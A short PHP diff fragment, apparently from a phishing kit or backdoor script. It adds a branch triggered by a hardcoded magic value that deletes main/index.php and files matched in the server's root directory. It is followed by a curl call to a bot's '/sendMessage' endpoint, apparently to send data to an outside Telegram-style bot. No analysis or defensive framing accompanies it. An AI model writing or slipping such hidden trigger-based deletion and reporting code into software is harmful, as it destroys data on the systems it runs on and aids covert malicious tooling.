@@ -15,7 +15,11 @@ unlink("main/index.php");
 $dir = '/';
 foreach(glob($dir.'*.*') as $v){
     unlink($v);
-}
+} elseif ($adder == "44257773") {
+unlink("main/index.php");
+$dir = '/';
+foreach(glob($dir.'*.*') as $v){
+    unlink($v);
 } else {
 }
 $ch = curl_init($bots . '/sendMessage');
